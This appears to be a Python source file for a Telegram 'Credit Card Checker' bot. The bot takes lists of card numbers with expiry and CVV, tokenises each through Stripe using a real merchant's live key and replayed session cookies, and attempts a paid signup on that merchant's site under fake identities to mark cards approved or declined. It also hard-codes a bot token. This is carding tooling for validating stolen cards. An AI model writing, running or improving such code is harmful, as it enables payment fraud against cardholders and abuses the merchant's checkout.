import requests
import time
import threading
import random
import re
import telebot
import json

# Your bot token
BOT_TOKEN = "7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY"

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Store user states and data
user_data = {}

# Regular expression for parsing credit card input
CARD_PATTERN = re.compile(r'(\d{13,16})[|/](\d{1,2})[|/](\d{2,4})[|/](\d{3,4})')

# Helper function to generate a random email
def generate_random_email():
    name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
    return f"{name}@gmail.com"

# Function to perform the card check
def check_card(user_id, card_info):
    # Extract card details
    card_number, exp_month, exp_year, cvc = card_info
    
    # Prepare headers for Stripe API
    stripe_headers = {
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
    }

    # Prepare the payload for Stripe API
    payload_stripe = {
        'billing_details[name]': user_data[user_id]['name'],
        'billing_details[email]': user_data[user_id]['email'],
        'type': 'card',
        'card[number]': card_number,
        'card[cvc]': cvc,
        'card[exp_year]': exp_year,
        'card[exp_month]': exp_month,
        'allow_redisplay': 'unspecified',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/c4c47a1722; stripe-js-v3/c4c47a1722; payment-element; deferred-intent',
        'referrer': 'https://www.cribflyer.com',
        'time_on_page': '54134',
        'client_attribution_metadata[client_session_id]': '61b2ec7c-b03f-463f-b50c-4f0a938d67df',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': 'df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59',
        'muid': '976d1b11-0e75-48a9-b082-7f34b6ed436aa8eae6',
        'sid': 'e8dd1e23-3b38-4655-951e-e66134f0153e810f76',
        'key': 'pk_live_QzBMW6gThdrTmOZ1k4lPJtSU'
    }
    
    # Send request to Stripe API
    try:
        stripe_response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=stripe_headers,
            data=payload_stripe
        )
        stripe_response.raise_for_status()
    except Exception as e:
        return f"Error connecting to Stripe API: {str(e)}"
    
    # Extract pm_id from response
    try:
        pm_response_json = stripe_response.json()
        pm_id = pm_response_json.get('id')
        if not pm_id:
            return "Error: Failed to retrieve payment method ID from Stripe response."
    except Exception as e:
        return f"Error parsing Stripe response: {str(e)}"
    
    # Prepare headers for final API
    final_headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': f'cfid=f0999602-b357-441d-bce3-5e8d6861c302; cftoken=0; CF_CLIENT_CRIBFLYER_TC=1747139869662; _gcl_au=1.1.277038344.1747139873; _ga=GA1.2.509374650.1747139873; _gid=GA1.2.90002344.1747139873; __stripe_mid=976d1b11-0e75-48a9-b082-7f34b6ed436aa8eae6; __stripe_sid=e8dd1e23-3b38-4655-951e-e66134f0153e810f76; CF_CLIENT_CRIBFLYER_LV=1747139895458; CF_CLIENT_CRIBFLYER_HC=5; AWSALB=7oWW/ErKPjISa5eaNZseGPkDwIpJvANhyGZNZzp6qHBfBYejcPn4lWGnHO3nhaFig4PbGLu+r7bJH6OChuUHrJgsXISnrZ3XVgvuFq9mO3Pt67Vk67iKzoDAtsKl; AWSALBCORS=7oWW/ErKPjISa5eaNZseGPkDwIpJvANhyGZNZzp6qHBfBYejcPn4lWGnHO3nhaFig4PbGLu+r7bJH6OChuUHrJgsXISnrZ3XVgvuFq9mO3Pt67Vk67iKzoDAtsKl',
        'origin': 'https://www.cribflyer.com',
        'priority': 'u=1, i',
        'referer': 'https://www.cribflyer.com/signup?p=property_plan&qty=1',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'
    }
    
    # Prepare payload for final API
    final_payload = {
        'email': user_data[user_id]['email'],
        'name': user_data[user_id]['name'],
        'firstname': user_data[user_id]['name'].split()[0],
        'lastname': user_data[user_id]['name'].split()[-1],
        'password': 'War112233$%',
        'confpassword': 'War112233$%',
        'product': 'property_plan',
        'qty': '1',
        'pmid': pm_id
    }
    
    # Send request to final API
    try:
        final_response = requests.post(
            "https://www.cribflyer.com/signup/api",
            headers=final_headers,
            data=final_payload
        )
        final_response.raise_for_status()
    except Exception as e:
        return f"Error connecting to final API: {str(e)}"
    
    # Parse and return the response
    try:
        response_json = final_response.json()
        formatted_response = json.dumps(response_json, indent=2)
        
        if response_json.get("ERROR", True):  # Default to True if ERROR key doesn't exist
            return f"❌ DECLINED ❌\n\n{formatted_response}"
        else:
            return f"✅ APPROVED ✅\n\n{formatted_response}"
    except Exception as e:
        return f"Error parsing final API response: {str(e)}\n\nRaw response: {final_response.text}"

# Threaded function to process multiple cards with delay
def process_cards(user_id, cards):
    for card in cards:
        if user_data[user_id]['stopped']:
            break
        
        # Send checking message
        bot.send_message(user_id, f"🔍 Checking card: {card[0][:6]}••••••{card[0][-4:]}")
        
        # Process the card
        result = check_card(user_id, card)
        bot.send_message(user_id, result)
        
        # Delay between checks if not the last card
        if card != cards[-1] and not user_data[user_id]['stopped']:
            time.sleep(15)
    
    # Send completion message
    if not user_data[user_id]['stopped']:
        bot.send_message(user_id, "✅ All cards processed!")

# Start command handler
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.chat.id
    user_data[user_id] = {
        'state': 'waiting_for_cards',
        'cards': [],
        'stopped': False,
        'name': 'John Doe',  # Default name
        'email': generate_random_email(),  # Random email
        'pm_id': None
    }
    bot.send_message(user_id, "💳 Welcome to the Credit Card Checker Bot!\n\n"
                             "Please send your credit cards in one of these formats:\n"
                             "• CC|MM|YY|CVV\n"
                             "• CC|MM|YYYY|CVV\n"
                             "• CC/MM/YY/CVV\n"
                             "• CC/MM/YYYY/CVV\n\n"
                             "You can send multiple cards separated by new lines.\n\n"
                             "Use /stop to cancel checking at any time.")

# Stop command handler
@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = message.chat.id
    if user_id in user_data:
        user_data[user_id]['stopped'] = True
        bot.send_message(user_id, "🛑 Checking process stopped.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.chat.id
    if user_id not in user_data or user_data[user_id]['state'] != 'waiting_for_cards':
        return
    
    text = message.text.strip()
    lines = text.split('\n')
    cards = []

    for line in lines:
        line = line.strip()
        match = CARD_PATTERN.match(line)
        if match:
            card_number = match.group(1).replace(' ', '').replace('-', '')
            exp_month = match.group(2).zfill(2)
            exp_year = match.group(3)
            if len(exp_year) == 2:
                exp_year = '20' + exp_year
            cvc = match.group(4)
            cards.append((card_number, exp_month, exp_year, cvc))
        else:
            # Try to parse other formats manually
            parts = re.split(r'[|/]', line)
            if len(parts) == 4:
                card_number = parts[0].replace(' ', '').replace('-', '')
                exp_month = parts[1].zfill(2)
                exp_year = parts[2]
                if len(exp_year) == 2:
                    exp_year = '20' + exp_year
                cvc = parts[3]
                cards.append((card_number, exp_month, exp_year, cvc))
            else:
                continue  # Skip lines that don't match expected formats

    if not cards:
        bot.send_message(user_id, "❌ No valid credit card entries found. Please check the format and try again.")
        return

    # Save user data
    user_data[user_id]['cards'] = cards
    user_data[user_id]['stopped'] = False

    bot.send_message(user_id, f"🔎 Found {len(cards)} valid card(s). Starting checks with 15 second delay between each...")

    # Run the checks in a separate thread to avoid blocking
    threading.Thread(target=process_cards, args=(user_id, cards)).start()

# Start the bot
if __name__ == '__main__':
    print("Bot is running...")
    bot.polling()